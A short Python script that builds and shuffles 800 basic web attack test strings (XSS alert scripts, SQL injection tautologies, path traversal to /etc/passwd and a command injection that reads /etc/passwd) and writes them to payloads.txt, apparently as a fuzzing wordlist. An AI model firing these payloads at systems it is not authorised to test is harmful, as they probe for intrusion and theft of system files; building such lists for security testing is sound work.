import random

def generate_xss():
    return [f"<script>alert({i})</script>" for i in range(1, 201)]

def generate_sqli():
    return [f"' OR {i}={i} --" for i in range(1, 201)]

def generate_lfi():
    return [f"../../{'../'*i}etc/passwd" for i in range(1, 201)]

def generate_rce():
    return [f"; cat /etc/passwd #{i}" for i in range(1, 201)]

payloads = (
    generate_xss() +
    generate_sqli() +
    generate_lfi() +
    generate_rce()
)

random.shuffle(payloads)

with open("payloads.txt", "w") as f:
    for p in payloads:
        f.write(p + "\n")

print(f"Generated {len(payloads)} payloads.")
